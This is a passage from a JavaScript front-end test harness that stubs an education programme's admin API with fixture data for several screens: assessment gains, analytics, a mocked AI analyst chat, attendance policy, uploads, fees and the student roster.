                    domainLabel: 'Social & emotional', maxScore: 40, items: 20, version: 1, locked: true,
                    gradeFrom: 4, gradeTo: 12, status: 'active', notes: '',
                    unit: 'difficulties score (lower is better)', scale: 'points', pctMeaningful: true,
                    higherIsBetter: false, source: 'Robert Goodman / Youthinmind',
                    licence: 'Free for non-commercial use', citation: 'Goodman, R. (1997).',
                    adaptNote: '', catalogueKey: 'sdq.total' },
      baselineWindow: 'AW-SB', endlineWindow: 'AW-SE',
      satBaseline: 20, satEndline: 18, paired: 18,
      baselineMeanPct: 52.5, endlineMeanPct: 40.0, pairedBaselinePct: 52.0,
      baselineMean: 21.0, endlineMean: 16.0, pairedBaselineMean: 20.8,
      pctMeaningful: true, scale: 'points', unit: 'difficulties score (lower is better)',
      higherIsBetter: false, improved: true,
      gain: { n: 18, mean: -4.5, sd: 2.9, lo: -5.9, hi: -3.1, d: -1.55, significant: true, tooThin: false },
      gainPct: -11.3, bySex: [], byBand: [], byCentre: [],
      attrition: { baselineOnly: 2, endlineOnly: 0, bias: null },
      caveats: [
        { level: 'method', text: 'On this instrument a LOWER score is the better result, so a negative change is the improvement. Read every figure below with that in mind.' },
      ],
    };
    var CATALOGUE = [
      { key: 'egra.orf', family: 'EGRA', name: 'EGRA · Oral reading fluency', domain: 'literacy',
        domainLabel: 'Literacy', unit: 'correct words per minute', scale: 'rate', scaleLabel: 'Rate per minute',
        maxScore: 200, items: 0, gradeFrom: 2, gradeTo: 6, gradeFromLabel: 'Primary 2', gradeToLabel: 'Primary 6',
        higherIsBetter: true,
        notes: 'A short passage read aloud for one minute.',
        adapt: 'Passage must be levelled to the local curriculum and kept identical between baseline and endline.',
        source: 'RTI International, for USAID', sourceUrl: 'https://shared.rti.org/',
        licence: 'Public good — free to download, adapt and use',
        citation: 'RTI International. (2015). Early Grade Reading Assessment (EGRA) Toolkit, Second Edition.',
        adopted: null },
      { key: 'sdq.total', family: 'SDQ', name: 'SDQ · Total difficulties', domain: 'sel',
        domainLabel: 'Social & emotional', unit: 'difficulties score (lower is better)', scale: 'points',
        scaleLabel: 'Marks out of a total', maxScore: 40, items: 20, gradeFrom: 4, gradeTo: 12,
        gradeFromLabel: 'Primary 4', gradeToLabel: 'SSS 3', higherIsBetter: false,
        notes: 'Twenty items across four difficulty subscales.',
        adapt: 'Official translations exist for many languages; use one rather than translating afresh.',
        source: 'Robert Goodman / Youthinmind', sourceUrl: 'https://www.sdqinfo.org/',
        licence: 'Paper versions free for non-commercial purposes', citation: 'Goodman, R. (1997).',
        adopted: { instrumentId: 'AI-2', name: 'SDQ total difficulties' } },
    ];
    window.__gain = GAIN;
    window.NGGApi.admin.assessGains = function () { return Promise.resolve({ gains: [GAIN, RATE] }); };
    window.NGGApi.admin.assessCatalogue = function () { return Promise.resolve({ catalogue: CATALOGUE,
      note: 'These are definitions, not papers. Every one still needs the local adaptation described on the entry.' }); };
    window.NGGApi.admin.assessAdopt = function (keys) { window.__adopted = keys; return Promise.resolve({ created: keys.map(function (k) { return { key: k, instrumentId: 'AI-NEW' }; }), existing: [], unknown: [] }); };
    window.NGGApi.admin.assessInstruments = function () { return Promise.resolve({ instruments: [GAIN.instrument] }); };
    window.NGGApi.admin.assessWindows = function () { return Promise.resolve({ windows: [
      { windowId: 'AW-B', instrumentId: 'AI-1', phase: 'baseline', label: 'Week 1', opensAt: '2026-07-06', closesAt: '2026-07-10', status: 'open', sat: 40, absent: 2 },
      { windowId: 'AW-E', instrumentId: 'AI-1', phase: 'endline', label: 'Week 6', opensAt: '2026-08-10', closesAt: '2026-08-14', status: 'open', sat: 24, absent: 1 },
    ] }); };
    window.NGGApi.admin.assessSheet = function () { return Promise.resolve({
      window: { windowId: 'AW-B', phase: 'baseline', label: 'Week 1', status: 'open' },
      instrument: GAIN.instrument,
      students: [
        { studentId: 'S1', name: 'Amina Alpha', centre: 'Egbeda', sex: 'Female', grade: 'Primary 5', gradeLevel: 5, outOfRange: false, noGrade: false, result: { score: 22, absent: false, note: '' } },
        { studentId: 'S2', name: 'Bola Beta', centre: 'Egbeda', sex: 'Male', grade: 'Primary 1', gradeLevel: 1, outOfRange: true, noGrade: false, result: null },
        { studentId: 'S3', name: 'Chidi Gamma', centre: 'Ijaiye', sex: 'Male', grade: '', gradeLevel: 0, outOfRange: false, noGrade: true, result: null },
      ] }); };
    window.NGGApi.admin.assessRecord = function (w, r) { window.__recorded = { windowId: w, results: r }; return Promise.resolve({ saved: r.length, cleared: 0, rejected: [] }); };
  } else if (b === 'analytics') {
    props = {};
    var CC = [
      { centreId: 'c1', name: 'Egbeda', code: 'EG', color: '#3B5BDB', enrolled: 96, presentToday: 88, attendanceRate: 91, avgGrade: 71, activities: 54, stars: 210, evidence: 62 },
      { centreId: 'c2', name: 'Ijaiye', code: 'IJ', color: '#C2410C', enrolled: 74, presentToday: 60, attendanceRate: 84, avgGrade: 66, activities: 41, stars: 150, evidence: 44 },
      { centreId: 'c3', name: 'Sunshine', code: 'SU', color: '#0E9F6E', enrolled: 58, presentToday: 34, attendanceRate: 61, avgGrade: 60, activities: 22, stars: 70, evidence: 9 },
      { centreId: 'c4', name: 'Ayobo Hub', code: 'AY', color: '#A21CAF', enrolled: 38, presentToday: 17, attendanceRate: 47, avgGrade: 55, activities: 12, stars: 30, evidence: 0 },
    ];
    window.NGGApi.admin.analytics = function () { return Promise.resolve({ workspace: {
      generatedAt: '2026-08-02T09:41:00Z',
      filters: { rangeLabel: 'Weeks 1-6', options: { weeks: ['1', '2'], centres: CC.map(function (c) { return c.name; }), departments: [], categories: [] } },
      executive: { totalStudents: 266, presentToday: 199, centres: 4, departments: 6, attendanceRate: 78,
                   weeklyGrowth: 4, activities: 129, assessments: { total: 1204, graded: 938, pending: 266 },
                   bestCentre: { name: 'Egbeda', rate: 91 }, bestStudent: { name: 'A B', centre: 'Egbeda', attendanceRate: 98 },
                   program: { week: 4 } },
      operations: { daily: [{ date: '2026-07-06', present: 268, late: 3, rate: 70 }, { date: '2026-07-07', present: 291, late: 2, rate: 74 },
                            { date: '2026-07-08', present: 334, late: 1, rate: 84 }],
                    engagement: { engagementPct: 62, studentsStarred: 140, avgStarsPerStudent: 2.1 },
                    volunteers: { active: 31, cleared: 28 },
                    teacherActivity: [{ name: 'M One', department: 'Music', starsGiven: 40, ratings: 12, activities: 9 }],
                    lessonCompletion: { submitted: 1204, graded: 938, pending: 266 },
                    missingReports: ['Sunshine', 'Ayobo Hub'], assessmentsDue: [] },
      research: { scatter: [{ x: 90, y: 70, centre: 'Egbeda' }, { x: 50, y: 55, centre: 'Ayobo Hub' }],
                  correlation: 0.62,
                  gender: [{ gender: 'Female', count: 186, attendanceRate: 80, avgGrade: 68 },
                           { gender: 'Male', count: 152, attendanceRate: 76, avgGrade: 65 }],
                  age: [{ band: '8-10', count: 90, attendanceRate: 80, avgGrade: 66 }],
                  centreComparison: CC,
                  longitudinal: [{ week: 1, avgGrade: 58 }, { week: 4, avgGrade: 67 }],
                  intervention: { preWeek: 1, preGrade: 58, postWeek: 4, postGrade: 67, delta: 9, improvementPct: 15.5 },
                  stats: { attendance: { n: 266, mean: 78, median: 80, sd: 14, min: 20, max: 100 },
                           grades: { n: 289, mean: 66, median: 67, sd: 9, min: 32, max: 96 } } },
      evidence: { byType: [{ type: 'photo', count: 101 }], total: 163,
                  gallery: [{ activityId: 'a1', title: 'Tie & dye', category: 'craft', centre: 'Egbeda', date: '2026-07-08', evidence: [{ type: 'photo', url: '' }] }] },
      rankings: { centres: CC, topStudents: [], awards: [], v3: null },
      timeline: [],
    } }); };
    window.NGGApi.admin.analyticsDrill = function (m, f) { window.__drill = { metric: m, centre: f && f.centre }; return Promise.resolve({ rows: [] }); };
    window.NGGApi.admin.analyticsGrowth = function () { return Promise.resolve({ growth: null }); };
    window.NGGApi.admin.analyticsDepth = function () { return Promise.resolve({ depth: { empty: true } }); };
    window.NGGApi.admin.analyticsInsight = function () { return Promise.resolve({ panel: null }); };
  } else if (b === 'analyst') {
    /* The docked Analyst. Stubbed at the API boundary rather than at the
       component's, so the pane runs its real pipeline: optimistic turn, thread
       re-read, confidence derived from the claims, grounding check honoured. */
    props = { onClose: function () { window.__closed = true; } };
    window.nggPublishScope({ section: 'Analytics', centre: 'Ayobo Hub', week: '',
                             rangeLabel: 'Weeks 1-6', centres: ['Ayobo Hub', 'Egbeda'] });
    window.__threads = [{ threadId: 'th1', title: 'Ayobo decline', centre: 'Ayobo Hub',
                          rangeLabel: 'Weeks 1-6', turns: 1, updatedAt: '2026-08-01T09:00:00Z' }];
    var TURN = {
      seq: 1, question: 'Why is Ayobo falling?',
      answer: 'It reads as retention, not teaching. 14 of 38 students have not attended since week 2.',
      status: 'ok', rangeLabel: 'Weeks 1-6', evidenceFp: 'ev-9f2a', providers: ['mock'], ms: 4200,
      plan: { restated: 'What explains the Ayobo attendance drop?', by: 'router',
              why: 'A cause question with a comparison in it.',
              lensesRan: [{ key: 'mechanism', label: 'Mechanism', ok: true },
                          { key: 'risk', label: 'Risk', ok: true },
                          { key: 'equity', label: 'Equity', ok: false }],
              composed: true, followups: ['List the 14 lapsed students', 'Compare with Egbeda'] },
      claims: [{ claim: 'The drop is concentrated in Saturday sessions.', evidence: 'attendance 1,140',
                 confidence: 'high', agreed: true, lenses: ['mechanism', 'risk'] },
               { claim: 'n = 38 is small enough that one session swings it.', evidence: 'centres 5',
                 confidence: 'medium', agreed: false, lenses: ['risk'] }],
      checks: { grounded: true, evidenceNumbers: 61, claims: [], answerUnverified: [],
                dropped: [{ block: 'table', unverified: ['412'] }] },
      /* The answer as data. Every figure here passed the same grounding check
         as the prose; the dropped note above is a block that did not. */
      data: {
        stats: [{ label: 'Attendance', value: '47%', note: 'down 9', tone: 'bad' },
                { label: 'Lapsed', value: '14', note: 'of 38', tone: 'warn' },
                { label: 'Saturdays', value: '2', note: 'sessions', tone: 'neutral' }],
        chart: { kind: 'line', label: 'Ayobo attendance by week', unit: '%', watch: 55,
                 points: [{ x: 'wk1', y: 68 }, { x: 'wk2', y: 61 }, { x: 'wk3', y: 56 }, { x: 'wk4', y: 47 }] },
        table: { title: 'Centres this week', columns: ['Centre', 'Att.', 'Change'], bar: 1, delta: 2,
                 rows: [['Egbeda', '91', '+3'], ['Ijaiye', '84', '+1'], ['Ayobo Hub', '47', '-9']] },
        caveat: 'n = 38 is small — one Saturday session swings this centre by about 5 points.',
      },
    };
    window.__turn = TURN;
    window.NGGApi.admin.insightChatThreads = function () { return Promise.resolve({ threads: window.__threads }); };
    window.NGGApi.admin.insightChatThread = function () {
      return Promise.resolve({ thread: { threadId: 'th1', title: 'Ayobo decline', centre: 'Ayobo Hub',
                                         turns: [window.__turn] } });
    };
    window.NGGApi.admin.insightChatAsk = function (d) { window.__asked = d; return Promise.resolve({ threadId: 'th1' }); };
    window.NGGApi.admin.insightChatArchive = function (id) { window.__archived = id; window.__threads = []; return Promise.resolve({}); };
    window.NGGApi.admin.insightChatRename = function (id, t) { window.__renamed = [id, t]; return Promise.resolve({ title: t }); };
  } else if (b === 'photo') {
    var pc = document.createElement('canvas'); pc.width = 800; pc.height = 1000;
    var px = pc.getContext('2d');
    px.fillStyle = '#88a'; px.fillRect(0, 0, 800, 1000);
    px.fillStyle = '#fff'; px.beginPath(); px.arc(400, 380, 190, 0, 7); px.fill();
    props = { target: { subjectType: 'student', subjectId: 'SUM-1' }, currentUrl: pc.toDataURL('image/png'),
              title: 'Test', onSaved: function () {}, onClose: function () {} };
  } else if (b === 'policy') {
    props = {};
    /* A term that is running, with today cancelled — the state that used to
       mark the entire cohort absent, and the one the banner must call out. */
    window.__saved = [];
    var TODAY = new Date().toISOString().slice(0, 10);
    window.NGGApi.admin.policy = {
      settings: function () { return Promise.resolve({
        programme: { enabled: true, startDate: '2026-07-06', endDate: '2026-08-28',
                     weekdays: [1, 2, 3, 4, 5], holidays: ['2026-07-15', TODAY], extraDays: ['2026-07-11'] },
        policy: { enabled: true, checkoutRequired: true,
                  student:   { lateRedline: '08:30', absenceLimit: 2, latenessCap: 3, postSuspensionLateness: 2, fine: 5000, suspensionDays: 14 },
                  volunteer: { lateRedline: '09:00', absenceLimit: 2, latenessCap: 4, postSuspensionLateness: 2, fine: 10000, suspensionDays: 14, reviewMissedCap: 2 },
                  musing: { enabled: true, endsAt: '08:00' },
                  idCard: { secondOffenceFine: 1000, lostFine: 2000 },
                  reinstatement: { coolOffDays: 365, fine: 10000, training: 'CIMC 1' } },
        calendar: { today: TODAY, isProgrammeDay: false, nextDay: '2026-07-20', elapsed: 9, total: 40,
                    sweptThrough: '2026-07-17', upcoming: ['2026-07-20', '2026-07-21'] },
      }); },
      board: function () { return Promise.resolve({ policyEnabled: true,
        tally: { warned: 1, dormant: 1, suspended: 1, evicted: 1, finesOwed: 15000 },
        board: [
          { personId: 'SUM-9', fullName: 'Evicted Person',   personType: 'student',   state: 'evicted',   absences: 3, absenceLimit: 2, lates: 0, latenessCap: 3, finesOwed: 0,     awardsEligible: false, until: '' },
          { personId: 'VOL-1', fullName: 'Suspended Person', personType: 'volunteer', state: 'suspended', absences: 0, absenceLimit: 2, lates: 4, latenessCap: 4, finesOwed: 10000, awardsEligible: false, until: '2026-08-01' },
          { personId: 'SUM-2', fullName: 'Dormant Person',   personType: 'student',   state: 'dormant',   absences: 2, absenceLimit: 2, lates: 0, latenessCap: 3, finesOwed: 5000,  awardsEligible: false, until: '' },
          { personId: 'SUM-3', fullName: 'Warned Person',    personType: 'student',   state: 'warned',    absences: 1, absenceLimit: 2, lates: 0, latenessCap: 3, finesOwed: 0,     awardsEligible: true,  until: '' },
        ] }); },
      person: function (id) { return Promise.resolve({ personId: id, personType: 'student',
        state: { state: 'dormant', absences: 2, absenceLimit: 2, lates: 1, latenessCap: 3, halfDays: 0, finesOwed: 5000, awardsEligible: false, reason: 'Absence 2 of 2 — Dormant Track.' },
        infractions: [{ id: 11, date: '2026-07-07', kind: 'absence', note: 'No check-in scan on a programme day.', voidedAt: '' },
                      { id: 12, date: '2026-07-06', kind: 'absence', note: 'No check-in scan.', voidedAt: '2026-07-09', voidReason: 'Wrong student.' }],
        sanctions: [{ id: 21, kind: 'dormant', tier: 2, reason: 'Absence 2 of 2 — Dormant Track.', amount: 0, status: 'active', issuedAt: '2026-07-07', endsAt: '' },
                    { id: 22, kind: 'fine', tier: 2002, reason: 'ID card not worn.', amount: 5000, status: 'pending', issuedAt: '2026-07-08', endsAt: '' }] }); },
      save: function (programme, policy) { window.__saved.push({ programme: programme, policy: policy }); return Promise.resolve({ ok: true, calendar: {} }); },
      sweep: function () { return Promise.resolve({ ok: true, days: 2, absences: 3 }); },
      dayToggle: function () { return Promise.resolve({ ok: true }); },
      void: function () { return Promise.resolve({ ok: true }); },
      update: function () { return Promise.resolve({ ok: true }); },
      infraction: function () { return Promise.resolve({ ok: true, temporaryCard: true, state: {} }); },
      reinstate: function () { return Promise.resolve({ ok: true, reinstated: true }); },
    };
  } else if (b === 'gatephoto') {
    window.__uploaded = [];
    window.NGGApi.uploadPublic = function (f) { window.__uploaded.push(f.name || 'blob'); return Promise.resolve({ url: 'https://res.cloudinary.com/x/image/upload/v1/p.jpg' }); };
    /* What the component actually calls. It uploads when a cloud is configured
       and hands the image back INLINE when one is not — Cloudinary is opt-in, and
       a desk that cannot take a photo without it is not. uploads=off is the
       fresh-deployment case, which is the one that used to say "photo uploads
       aren't set up on this server yet" and leave the child with no photograph. */
    window.NGGApi.uploadOrInline = function (f) {
      window.__uploaded.push(f.name || 'blob');
      if (new URLSearchParams(location.search).get('uploads') === 'off') {
        return Promise.resolve({ url: 'data:image/png;base64,iVBORw0KGgo=', inline: true });
      }
      return Promise.resolve({ url: 'https://res.cloudinary.com/x/image/upload/v1/p.jpg', inline: false });
    };
    props = { photoUrl: '', setPhotoUrl: function (u) { window.__photo = u; }, onBack: function () {}, onNext: function () {},
              card: {}, gold: '#f5b026', goldInk: '#2b2100', mut: {} };
  } else if (b === 'capture') {
    window.__uploaded = [];
    window.NGGApi.uploadFile = function (f) { window.__uploaded.push(f.name || 'blob'); return Promise.resolve({ url: 'https://res.cloudinary.com/x/image/upload/v1/p.jpg' }); };
    window.NGGApi.uploadOrInline = function (f) { window.__uploaded.push(f.name || 'blob'); return Promise.resolve({ url: 'https://res.cloudinary.com/x/image/upload/v1/p.jpg', inline: false }); };
    props = { value: '', onChange: function (u) { window.__photo = u; }, size: 96, label: 'Photo' };
  } else if (b === 'fieldupload') {
    window.__cfg = new URLSearchParams(location.search).get('uploads') || 'on';
    window.NGGApi.config = function () {
      return Promise.resolve(
        window.__cfg === 'off' ? { uploads: { enabled: false }, publicUpload: { enabled: false } }
        : window.__cfg === 'missing' ? {}                       // config.php that omits the block
        // Only an unsigned preset — no signed keys. A very common deployment,
        // and the one that used to hide the button completely.
        : window.__cfg === 'unsigned' ? { uploads: { enabled: false }, publicUpload: { enabled: true } }
        : { uploads: { enabled: true }, publicUpload: { enabled: false } });
    };
    window.NGGApi.uploadFile = function (f) {
      if (window.__cfg === 'unsigned') return Promise.reject(new Error('uploads_disabled'));
      window.__uploaded = (window.__uploaded || []).concat([f.name]);
      return Promise.resolve({ url: 'https://res.cloudinary.com/x/image/upload/v1/hero.jpg' });
    };
    window.NGGApi.uploadPublic = function (f) { window.__uploaded = (window.__uploaded || []).concat(['public:' + f.name]); return Promise.resolve({ url: 'https://res.cloudinary.com/x/image/upload/v1/hero.jpg' }); };
    props = { label: 'Hero image (giant model)', value: '', onChange: function (v) { window.__val = v; }, kind: 'cover', placeholder: 'Paste an https:// image URL or upload →' };
  } else if (b === 'centre') {
    // A full-body cut-out with the feet hard against the bottom of the file —
    // the shape the hero art actually is, and the one that showed the cut.
    var MODEL = 'data:image/svg+xml;utf8,' + encodeURIComponent(
      '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="1400" viewBox="0 0 600 1400">'
      + '<circle cx="300" cy="150" r="105" fill="#3b2a1e"/>'
      + '<rect x="150" y="300" width="300" height="520" rx="40" fill="#c62828"/>'
      + '<rect x="185" y="820" width="105" height="520" fill="#1a237e"/>'
      + '<rect x="310" y="820" width="105" height="520" fill="#1a237e"/>'
      + '<rect x="170" y="1340" width="260" height="60" rx="18" fill="#111"/></svg>');
    // Assign INTO the existing public proxy, not over it: the top-level deep()
    // lists 'public' in its overrides, and overrides win over the target.
    var LONG = new URLSearchParams(location.search).get('long') === '1';
    window.NGGApi.public.centre = function () { return Promise.resolve({ centre: {
      centreId: 'C-IJ', slug: 'ijaiye', name: 'Ijaiye', code: 'IJ', color: '#f5b026',
      headline: LONG ? 'Ijaiye Community Arts And Technology Centre' : 'Ijaiye',
      tagline: LONG ? 'Where the noise becomes a name, and the name becomes a movement across every street in Alimosho.' : 'Where the noise becomes a name.',
      status: 'active', pageStatus: 'published',
      heroImageUrl: MODEL, heroPosition: 'center bottom', enrolled: 42, capacity: 60,
      address: '12 Ijaiye Rd', area: 'Ijaiye', story: 'A story.', gallery: [], volunteers: [], needs: [],
    } }); };
    props = { slug: 'ijaiye', go: function () {}, setPage: function () {} };
  } else if (b === 'fees') {
    /* Two members whose accounts point opposite ways, which is the whole reason
       the arrears list ranks by PAYABLE rather than by what is charged:
       Bode carries a bigger CHARGE (his training fee is untouched, he is still
       in training) but Ada is the one further into service, so more of hers has
       been earned off. Rank by charged and the wrong person is at the top of the
       call list. */
    var FEECFG = { enabled: true, currency: 'NGN', membershipFee: 5000, monthlyDues: 1000,
                   trainingFee: 75000, trainingMonths: 18, serviceMonths: 18,
                   balanceCap: 500000, remindEnabled: true, remindEveryDays: 14, remindMinBalance: 1,
                   upratePct: 15, uprateEveryMonths: 12, uprateLastAt: '' };
    window.__feesSaved = [];
    window.NGGApi.admin.fees = {
      /* The bounds travel with the settings, exactly as the server sends them —
         the screen has no copy of any of these numbers, so a fixture that omits
         them renders nothing, which is the point. */
      settings: function () { return Promise.resolve({ fees: FEECFG, defaults: FEECFG,
        amountMax: 10000000, remindMinDays: 7,
        bounds: { amountMax: 10000000, phaseMin: 1, phaseMax: 120, remindMinDays: 7, remindMaxDays: 365,
                  uprateMaxPct: 50, uprateEveryMin: 1, uprateEveryMax: 120, uprateRound: 10,
                  uprateFields: ['membershipFee', 'monthlyDues', 'trainingFee'],
                  accrueBatch: 500, remindBatch: 200, arrearsPage: 200 } }); },
      settingsSet: function (d) { window.__feesSaved.push(d); return Promise.resolve({ fees: Object.assign({}, d, { remindEveryDays: Math.max(7, d.remindEveryDays || 14) }) }); },
      arrears: function () {
        return Promise.resolve({
          totalPayable: 96000, matched: 2, truncated: false,
          arrears: [
            { memberId: 'NGG-2026-0001', fullName: 'Ada Obi', centre: 'Egbeda', payable: 62000,
              outstanding: 80000, trainingEarned: 18000, atCap: false, phase: 'service', remindOff: false, guardianPhone: '08031110001' },
            { memberId: 'NGG-2026-0002', fullName: 'Bode Eze', centre: 'Ijaiye', payable: 34000,
              outstanding: 34000, trainingEarned: 0, atCap: true, phase: 'training', remindOff: true, guardianPhone: '08031110002' },
          ], settings: FEECFG });
      },
      member: function (id) {
        return Promise.resolve({ account: {
          memberId: id, fullName: 'Ada Obi', centre: 'Egbeda', status: 'active',
          guardian: { name: 'Mrs Obi', phone: '08031110001', email: 'obi@example.com' },
          remindOff: false, settings: FEECFG, mouAt: '',
          balance: { charged: 101000, credited: 21000, outstanding: 80000, payable: 62000,
                     trainingCharged: 75000, trainingWrittenOff: 0, trainingEarned: 18000,
                     byKind: { membership: 5000, dues: 21000, training: 75000, payment: 21000 },
                     cap: 500000, atCap: false, mouAt: '',
                     tenure: { start: '2024-09-01', months: 22, phase: 'service', trainingMonths: 18,
                               serviceMonths: 18, servedMonths: 4, complete: false } },
          entries: [
            { entryId: 'FEE-1', kind: 'payment', direction: 'credit', amount: 21000, periodKey: 'payment:x',
              sessionId: '', note: '', method: 'transfer', reference: 'TRF-9', createdAt: '2026-07-02T09:00:00Z', void: false, voidReason: '' },
            { entryId: 'FEE-2', kind: 'training', direction: 'charge', amount: 75000, periodKey: 'SES-2026',
              sessionId: 'SES-2026', note: 'Training fee — 2026 session', createdAt: '2026-06-01T09:00:00Z', void: false, voidReason: '' },
            { entryId: 'FEE-3', kind: 'dues', direction: 'charge', amount: 1000, periodKey: '2026-06',
              sessionId: '', note: 'Monthly dues 2026-06', createdAt: '2026-06-01T09:00:00Z', void: true, voidReason: 'charged twice' },
          ] } });
      },
      payment: function () { return Promise.resolve({ ok: true, entryId: 'FEE-9' }); },
      void: function () { return Promise.resolve({ ok: true }); },
      mou: function () { return Promise.resolve({ ok: true, writtenOff: 57000 }); },
      remindOff: function () { return Promise.resolve({ ok: true }); },
      accrue: function () { return Promise.resolve({ accrued: { members: 2, membership: 0, dues: 2, training: 0, atCap: 1, noJoinDate: 0 } }); },
      /* Two due, and a named reason for each of the five who are not — including
         the one whose training fee is being written off, which is the exclusion
         that stops the programme chasing money it has already forgiven. */
      remindPreview: function () {
        window.__remindPreviews = (window.__remindPreviews || 0) + 1;
        return Promise.resolve({ preview: {
          count: 2, everyDays: 14, enabled: true,
          due: [{ memberId: 'NGG-2026-0001', fullName: 'Ada Obi', payable: 62000, lastRemindedAt: '' },
                { memberId: 'NGG-2026-0002', fullName: 'Bode Eze', payable: 34000, lastRemindedAt: '2026-06-01T09:00:00Z' }],
          skipped: { off: 0, optedOut: 1, nothingPayable: 3, underMinimum: 0, tooSoon: 2, noEmail: 1 },
        } });
      },
      remindRun: function () { window.__remindRuns = (window.__remindRuns || 0) + 1;
        return Promise.resolve({ result: { sent: 2, failed: 0, due: 2, everyDays: 14 } }); },
      /* An uprate that is DUE, so the screen has to show the proposal and the
         button. The balance ceiling is deliberately absent from the changes — the debt
         ceiling is a protection, not a price, and the test below asserts the
         screen never offers to raise it. */
      upratePreview: function () {
        window.__upratePreviews = (window.__upratePreviews || 0) + 1;
        return Promise.resolve({
          uprate: { enabled: true, pct: 15, everyMonths: 12, lastAt: '2025-07-01T09:00:00Z',
                    monthsSince: 13, due: true,
                    changes: { membershipFee: { from: 5000, to: 5750 },
                               monthlyDues: { from: 1000, to: 1150 },
                               trainingFee: { from: 75000, to: 86250 } } },
          maxPct: 50, round: 10, fields: ['membershipFee', 'monthlyDues', 'trainingFee'] });
      },
      /* Two results, and the one that matters is the member who owes NOTHING —
         invisible to the arrears list by design, which is the whole reason this
         box exists. */
      lookup: function (q) {
        window.__lookups = (window.__lookups || 0) + 1;
        return Promise.resolve({ q: q, truncated: false, max: 25, members: [
          { memberId: 'NGG-2026-0001', fullName: 'Ada Obi', centre: 'Egbeda', type: 'NGG',
            status: 'active', payable: 62000, charged: 101000, credited: 21000, phase: 'service' },
          { memberId: 'NGG-2026-0009', fullName: 'Sade Squared', centre: 'Ayobo', type: 'NGG',
            status: 'active', payable: 0, charged: 6000, credited: 6000, phase: 'training' },
        ] });
      },
      charge: function (memberId, kind, amount, reason, note) {
        window.__charges = (window.__charges || []).concat([{ kind: kind, amount: amount, reason: reason, note: note }]);
        return Promise.resolve({ entryId: 'FEE-N', balance: { outstanding: 80000 }, overCap: false });
      },
      waive: function (memberId, amount, reason) {
        window.__waives = (window.__waives || []).concat([{ amount: amount, reason: reason }]);
        return Promise.resolve({ entryId: 'FEE-W', waived: Math.min(amount, 80000), clamped: amount > 80000 });
      },
      uprateApply: function () { window.__uprateApplies = (window.__uprateApplies || 0) + 1;
        return Promise.resolve({ applied: { monthlyDues: { from: 1000, to: 1150 } }, pct: 15,
                                 fees: Object.assign({}, FEECFG, { monthlyDues: 1150 }) }); },
    };
    props = {};
  } else if (b === 'composer') {
    /* The community composer on its own, so its LAYOUT can be measured without
       standing up the whole feed. */
    window.NGGApi.member.community = window.NGGApi.member.community || {};
    window.NGGApi.member.community.mentions = function () { return Promise.resolve({ people: [] }); };
    props = { channels: [{ slug: 'commons', name: 'The Commons' }], active: 'commons',
              me: { memberId: 'M1', fullName: 'Test Member' }, onPosted: function () {}, enterToSend: false };
  } else if (b === 'account') {
    /* The member's own account, mid-service: a real balance, and a training fee
       part-earned-off — the number the card exists to show them. */
    /* Coherent with the real/notional split: ₦6,500 of REAL money (dues + a
       fine) less a ₦2,000 payment leaves ₦4,500 to pay, while the ₦75,000
       training fee is the cost of a free place and is never part of that. */
    var ACC = {
        memberId: 'NGG-2024-0117', payable: 4500, outstanding: 77500,
        charged: 81500, credited: 2000,
        realCharged: 6500, realCredited: 2000,
        programmeCost: 75000, programmeCovered: 18000,
        trainingCharged: 75000, trainingEarned: 18000, trainingWrittenOff: 0,
        trainingFeePerSession: 75000, schedule: [],
        mouAt: '', currency: 'NGN', remindOff: false,
        tenure: { start: '2024-09-01', months: 22, phase: 'service', trainingMonths: 18,
                  serviceMonths: 18, servedMonths: 4, complete: false,
                  standing: 'clear', creditPausedAt: '', creditStopped: false },
        entries: [
          { kind: 'payment', direction: 'credit', amount: 2000, note: '', createdAt: '2026-07-02T09:00:00Z', void: false },
          { kind: 'training', direction: 'charge', amount: 75000, note: 'Training fee — 2026 session', createdAt: '2026-06-01T09:00:00Z', void: false },
          { kind: 'dues', direction: 'charge', amount: 6000, note: 'Monthly dues 2026-05', createdAt: '2026-05-12T09:00:00Z', void: false },
          { kind: 'fine', direction: 'charge', amount: 500, note: 'Late arrival — three times in August', createdAt: '2026-05-11T09:00:00Z', void: false },
        ] };
    props = { account: ACC };
  } else if (b === 'roster') {
    window.__consentCalls = [];
    var KIDS = [
      { studentId: 'STU-1', displayId: 'EG-26-001', fullName: 'Amina Alpha', handle: 'amina', age: 12,
        centre: 'Egbeda', track: 'Piano', faculty: 'Music', guardianName: 'Mrs Alpha', guardianPhone: '08031110001',
        parentEmail: 'a@ex.co', notes: 'Peanut allergy', status: 'active', regStatus: 'verified',
        attendanceCount: 9, consentComplete: true, consents: { participation: 'granted' } },
      { studentId: 'STU-2', displayId: 'EG-26-002', fullName: 'Bode Beta', handle: 'bode', age: 13,
        centre: 'Egbeda', track: 'Graphics', faculty: 'Media', guardianName: 'Mr Beta', guardianPhone: '08031110002',
        parentEmail: '', notes: '', status: 'active', regStatus: 'parent_pending',
        attendanceCount: 0, consentComplete: false, consents: {} },
      { studentId: 'STU-3', displayId: 'EG-26-003', fullName: 'Chidi Gamma', handle: 'chidi', age: 14,
        centre: 'Ijaiye', track: 'Piano', faculty: 'Music', guardianName: '', guardianPhone: '',
        parentEmail: 'c@ex.co', notes: '', status: 'withdrawn', regStatus: 'verified',
        attendanceCount: 3, consentComplete: false, consents: { participation: 'declined' } },
      /* Verified, active, consented — and holding no token. The reported bug: the
         roster looked identical to a child who had an ID, so it was only ever
         discovered when a parent rang up or a gate turned the child away. */
      { studentId: 'STU-4', displayId: 'EG-26-004', fullName: 'Dele Delta', handle: 'dele', age: 11,
        centre: 'Egbeda', track: 'Piano', faculty: 'Music', guardianName: 'Mr Delta', guardianPhone: '08031110004',
        parentEmail: 'd@ex.co', notes: '', status: 'active', regStatus: 'verified', token: '',
        attendanceCount: 2, consentComplete: true, consents: { participation: 'granted' } },
    ];
    // STU-1 has one; nobody else does. The roster has to tell them apart.
    KIDS[0].token = 'SUMQR-STU1';
    /* School type, spelt as the data actually holds it: the dropdown's own
       'Public', an older row saying 'govt', a 'Private', and one child the
       question was never asked of. The backend normalises, so the roster must
       send a KEY and never these strings. */
    KIDS[0].schoolType = 'Public';   KIDS[0].schoolTypeKey = 'public';
    KIDS[1].schoolType = 'govt';     KIDS[1].schoolTypeKey = 'public';
    KIDS[2].schoolType = 'Private';  KIDS[2].schoolTypeKey = 'private';
    KIDS[3].schoolType = '';         KIDS[3].schoolTypeKey = '';
    KIDS[0].sex = 'Female'; KIDS[1].sex = 'Male'; KIDS[2].sex = 'Female'; KIDS[3].sex = 'Male';
